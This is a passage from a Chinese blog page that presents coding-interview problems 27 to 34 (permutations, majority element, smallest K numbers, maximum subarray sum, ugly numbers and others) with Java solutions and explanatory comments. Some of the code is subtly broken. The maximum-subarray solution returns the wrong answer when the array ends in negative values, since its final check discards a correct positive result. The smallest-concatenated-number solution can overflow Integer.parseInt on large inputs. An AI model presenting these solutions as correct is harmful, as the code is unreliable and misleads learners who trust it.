href="#题目描述-26" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个字符串,按字典序打印出该字符串中字符的所有排列。例如输入字符串abc,则打印出由字符a,b,c所能排列出来的所有字符串abc,acb,bac,bca,cab和cba。</p><p>输入描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 输入一个字符串,长度不超过9(可能有字符重复),字符只包括大小写字母。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="代码-26"><a href="#代码-26" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;String&gt; <span class="title">Permutation</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//保证字典序且去重</span></span><br><span class="line">        TreeSet&lt;String&gt; res = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        back(str, sb, res);</span><br><span class="line">        ArrayList&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String item : res) &#123;</span><br><span class="line">            result.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">back</span><span class="params">(String str, StringBuffer sb, TreeSet&lt;String&gt; res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str.length() == <span class="number">1</span>) &#123;</span><br><span class="line">            sb.append(str);</span><br><span class="line">            res.add(sb.toString());</span><br><span class="line">            sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(str.charAt(i));</span><br><span class="line">            StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer(str);</span><br><span class="line">            <span class="comment">//灵活使用StringBuffer的方法</span></span><br><span class="line">            back(stringBuffer.deleteCharAt(i).toString(), sb, res);</span><br><span class="line">            <span class="comment">//回溯</span></span><br><span class="line">            sb.deleteCharAt(sb.length()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="28-数组中出现次数超过一半的数字"><a href="#28-数组中出现次数超过一半的数字" class="headerlink" title="28.数组中出现次数超过一半的数字"></a>28.数组中出现次数超过一半的数字</h3><h4 id="标签：【数组】-2"><a href="#标签：【数组】-2" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-27"><a href="#题目描述-27" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。例如输入一个长度为9的数组{1,2,3,2,2,2,5,4,2}。由于数字2在数组中出现了5次，超过数组长度的一半，因此输出2。如果不存在则输出0。</p></blockquote><h4 id="代码-27"><a href="#代码-27" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//候选法</span></span><br><span class="line">        <span class="keyword">int</span> target = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (array == <span class="keyword">null</span> || array.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="comment">//战场无人，我方+1</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                target = array[i];</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//战场有人且是敌方的人，我方-1</span></span><br><span class="line">                <span class="keyword">if</span> (target != array[i]) &#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//战场有人且是我方的人，我方+1</span></span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//清理战场，确认我方人数超过一半，防止有一个人猫着在最后等两败俱伤才出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (array[i] == target) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; array.length / <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> target;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                target = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="29-最小的K个数"><a href="#29-最小的K个数" class="headerlink" title="29.最小的K个数"></a>29.最小的K个数</h3><h4 id="标签：【数组】【高级算法】"><a href="#标签：【数组】【高级算法】" class="headerlink" title="标签：【数组】【高级算法】"></a>标签：【数组】【高级算法】</h4><h4 id="题目描述-28"><a href="#题目描述-28" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入n个整数，找出其中最小的K个数。例如输入4,5,1,6,2,7,3,8这8个数字，则最小的4个数字是1,2,3,4,。</p></blockquote><h4 id="代码-28"><a href="#代码-28" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">GetLeastNumbers_Solution</span><span class="params">(<span class="keyword">int</span>[] input, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span> || input.length == <span class="number">0</span> || k &gt; input.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//优先级队列的应用，底层默认使用的是小顶堆</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length; i++) &#123;</span><br><span class="line">            queue.add(input[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="comment">//小顶堆堆顶元素永远是最小的元素</span></span><br><span class="line">            res.add(queue.remove());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="30-连续子数组的最大和"><a href="#30-连续子数组的最大和" class="headerlink" title="30.连续子数组的最大和"></a>30.连续子数组的最大和</h3><h4 id="标签：【数组】-3"><a href="#标签：【数组】-3" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-29"><a href="#题目描述-29" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>HZ偶尔会拿些专业问题来忽悠那些非计算机专业的同学。今天测试组开完会后,他又发话了:在古老的一维模式识别中,常常需要计算连续子向量的最大和,当向量全为正数的时候,问题很好解决。但是,如果向量中包含负数,是否应该包含某个负数,并期望旁边的正数会弥补它呢？例如:{6,-3,-2,7,-15,1,2,2},连续子向量的最大和为8(从第0个开始,到第3个为止)。给一个数组，返回它的最大连续子序列的和，你会不会被他忽悠住？(子向量的长度至少是1)</p></blockquote><h4 id="代码-29"><a href="#代码-29" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*   (类似股票买卖问题)</span></span><br><span class="line"><span class="comment">*对下标为i的元素array[i]，先试探的加上array[i], 如果和为负数，显然，以i结尾的元素对整个结果不作贡*献。</span></span><br><span class="line"><span class="comment">*具体过程：</span></span><br><span class="line"><span class="comment">*初始化：维护一个变量temp = 0</span></span><br><span class="line"><span class="comment">*如果temp+array[i] &lt; 0, 说明以i结尾的不作贡献，重新赋值temp = 0</span></span><br><span class="line"><span class="comment">*否则更新temp = temp + array[i]</span></span><br><span class="line"><span class="comment">*最后判断temp是否等于0， 如果等于0， 说明数组都是负数，选取一个最大值为答案。</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">FindGreatestSumOfSubArray</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp + array[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                temp = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp = temp + array[i];</span><br><span class="line">                res = Math.max(res, temp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> max = array[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array[i] &gt; max) &#123;</span><br><span class="line">                    max = array[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="31-整数中1出现的次数（从1到n整数中1出现的次数）"><a href="#31-整数中1出现的次数（从1到n整数中1出现的次数）" class="headerlink" title="31.整数中1出现的次数（从1到n整数中1出现的次数）"></a>31.整数中1出现的次数（从1到n整数中1出现的次数）</h3><h4 id="标签：【查找】【数学】"><a href="#标签：【查找】【数学】" class="headerlink" title="标签：【查找】【数学】"></a>标签：【查找】【数学】</h4><h4 id="题目描述-30"><a href="#题目描述-30" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>求出1~13的整数中1出现的次数,并算出100~1300的整数中1出现的次数？为此他特别数了一下1~13中包含1的数字有1、10、11、12、13因此共出现6次,但是对于后面问题他就没辙了。ACMer希望你们帮帮他,并把问题更加普遍化,可以很快的求出任意非负整数区间中1出现的次数（从1 到 n 中1出现的次数）。</p></blockquote><h4 id="代码-30"><a href="#代码-30" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设N = abcde ,其中abcde分别为十进制中各位上的数字。</span></span><br><span class="line"><span class="comment">如果要计算百位上1出现的次数，它要受到3方面的影响：百位上的数字，百位以下（低位）的数字，百位以上（高位）的数字。</span></span><br><span class="line"><span class="comment">① 如果百位上数字为0，百位上可能出现1的次数由更高位决定。比如：12013，则可以知道百位出现1的情况可能是：100~199，1100~1199,2100~2199，，...，11100~11199，一共1200个。可以看出是由更高位数字（12）决定，并且等于更高位数字（12）乘以 当前位数（100）。</span></span><br><span class="line"><span class="comment">② 如果百位上数字为1，百位上可能出现1的次数不仅受更高位影响还受低位影响。比如：12113，则可以知道百位受高位影响出现的情况是：100~199，1100~1199,2100~2199，，....，11100~11199，一共1200个。和上面情况一样，并且等于更高位数字（12）乘以 当前位数（100）。但同时它还受低位影响，百位出现1的情况是：12100~12113,一共114个，等于低位数字（113）+1。</span></span><br><span class="line"><span class="comment">③ 如果百位上数字大于1（2~9），则百位上出现1的情况仅由更高位决定，比如12213，则百位出现1的情况是：100~199,1100~1199，2100~2199，...，11100~11199,12100~12199,一共有1300个，并且等于更高位数字+1（12+1）乘以当前位数（100）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">NumberOf1Between1AndN_Solution</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1的个数</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//当前位</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> current = <span class="number">0</span>, after = <span class="number">0</span>, before = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n / i) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//当前位数字</span></span><br><span class="line">            current = (n / i) % <span class="number">10</span>; </span><br><span class="line">            <span class="comment">//高位数字</span></span><br><span class="line">            before = n / (i * <span class="number">10</span>); </span><br><span class="line">            <span class="comment">//低位数字</span></span><br><span class="line">            after = n - (n / i) * i; </span><br><span class="line">            <span class="comment">//如果为0,出现1的次数由高位决定,等于高位数字 * 当前位数</span></span><br><span class="line">            <span class="keyword">if</span> (current == <span class="number">0</span>)&#123;</span><br><span class="line">                count += before * i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果为1,出现1的次数由高位和低位决定,高位*当前位+低位+1    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (current == <span class="number">1</span>)&#123;</span><br><span class="line">                count += before * i + after + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果大于1,出现1的次数由高位决定,//（高位数字+1）* 当前位数    </span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                count += (before + <span class="number">1</span>) * i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//前移一位</span></span><br><span class="line">            i = i * <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="32-把数组排成最小的数"><a href="#32-把数组排成最小的数" class="headerlink" title="32.把数组排成最小的数"></a>32.把数组排成最小的数</h3><h4 id="标签：【数组】-4"><a href="#标签：【数组】-4" class="headerlink" title="标签：【数组】"></a>标签：【数组】</h4><h4 id="题目描述-31"><a href="#题目描述-31" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。例如输入数组{3，32，321}，则打印出这三个数字能排成的最小数字为321323。</p></blockquote><h4 id="代码-31"><a href="#代码-31" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">PrintMinNumber</span><span class="params">(<span class="keyword">int</span> [] numbers)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//实现一个类似于冒泡排序的算法，一个贪心的过程,每次找出使高位最小的那个数，比如，3,32组合332比323       //大，所以332口口口口口口也会比323口口口口口口要大，，然后将排完序的数字输出即可。</span></span><br><span class="line">        <span class="keyword">if</span>(numbers==<span class="keyword">null</span> || numbers.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;numbers.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(Integer.parseInt(numbers[i]+<span class="string">""</span>+numbers[j])&gt;</span><br><span class="line">                   Integer.parseInt(numbers[j]+<span class="string">""</span>+numbers[i]))&#123;</span><br><span class="line">                    <span class="keyword">int</span> temp=numbers[j];</span><br><span class="line">                    numbers[j]=numbers[i];</span><br><span class="line">                    numbers[i]=temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String res=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.length;i++)&#123;</span><br><span class="line">            res=res+numbers[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="33-丑数"><a href="#33-丑数" class="headerlink" title="33.丑数"></a>33.丑数</h3><h4 id="标签：【穷举】"><a href="#标签：【穷举】" class="headerlink" title="标签：【穷举】"></a>标签：【穷举】</h4><h4 id="题目描述-32"><a href="#题目描述-32" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>把只包含质因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含质因子7。 习惯上我们把1当做是第一个丑数。求按从小到大的顺序的第N个丑数。</p></blockquote><h4 id="代码-32"><a href="#代码-32" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//维持三个指针来记录当前乘以2、乘以3、乘以5的最小值，相当于从3个维度来决定数组的下一个数字，落后的指针有</span></span><br><span class="line"><span class="comment">//后发优势即可以乘上数组中在该指针后面位置存在的数字，然后当其被选为新的最小值后，要把相应的指针+1；因为</span></span><br><span class="line"><span class="comment">//这个指针会逐渐遍历整个数组，因此最终数组中的每一个值都会被乘以2、乘以3、乘以5</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">GetUglyNumber_Solution</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[index];</span><br><span class="line">        res[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//初始化指针指向最小丑数位置</span></span><br><span class="line">        <span class="keyword">int</span> p2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> p3=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> p5=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;index;i++)&#123;</span><br><span class="line">            res[i]=Math.min(<span class="number">2</span>*res[p2],Math.min(<span class="number">3</span>*res[p3],<span class="number">5</span>*res[p5]));</span><br><span class="line">            <span class="comment">//为了防止重复需要三个if都能够走到</span></span><br><span class="line">            <span class="keyword">if</span>(res[i]==<span class="number">2</span>*res[p2])&#123;</span><br><span class="line">                p2++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//为了防止重复需要三个if都能够走到</span></span><br><span class="line">            <span class="keyword">if</span>(res[i]==<span class="number">3</span>*res[p3])&#123;</span><br><span class="line">                p3++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//为了防止重复需要三个if都能够走到</span></span><br><span class="line">            <span class="keyword">if</span>(res[i]==<span class="number">5</span>*res[p5])&#123;</span><br><span class="line">                p5++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res[index-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="34-第一个只出现一次的字符"><a href="#34-第一个只出现一次的字符" class="headerlink" title="34.第一个只出现一次的字符"></a>34.第一个只出现一次的字符</h3><h4 id="标签：【字符串】-1"><a href="#标签：【字符串】-1" class="headerlink" title="标签：【字符串】"></a>标签：【字符串】</h4><h4 id="题目描述-33"><a href="#题目描述-33" class="headerlink" title="题目描述"></a>题目描述</h4><blockquote><p>在一个字符串(0&lt;=字符串长度&lt;=10000，全部由字母组成)中找到第一个只出现一次的字符,并返回它的位置, 如果没有则返回 -1（需要区分大小写）.（从0开始计数）</p></blockquote><h4 id="代码-33"><a href="#代码-33" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">FirstNotRepeatingChar</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="keyword">null</span> ||str.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(str.length()==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//LinkedHashMap维护插入顺序，记录以字符为key的元素出现次数以及位置</span></span><br><span class="line">        LinkedHashMap&lt;Character,Integer&gt; map=<span class="keyword">new</span> LinkedHashMap&lt;Character,Integer&gt;();</span><br><span class="line">        <span 